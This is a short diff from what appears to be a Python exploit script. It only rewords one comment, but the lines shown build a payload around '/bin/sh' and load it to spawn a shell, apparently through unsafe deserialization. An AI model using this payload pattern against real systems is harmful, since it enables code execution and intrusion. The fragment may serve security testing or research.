@@ -8,5 +8,5 @@ if __name__ == "__main__":
     payload.push_str("/bin/sh")
     payload.call_f(1)
 
-    # pop a shell
+    # Spawn a shell.
     payload.loads()
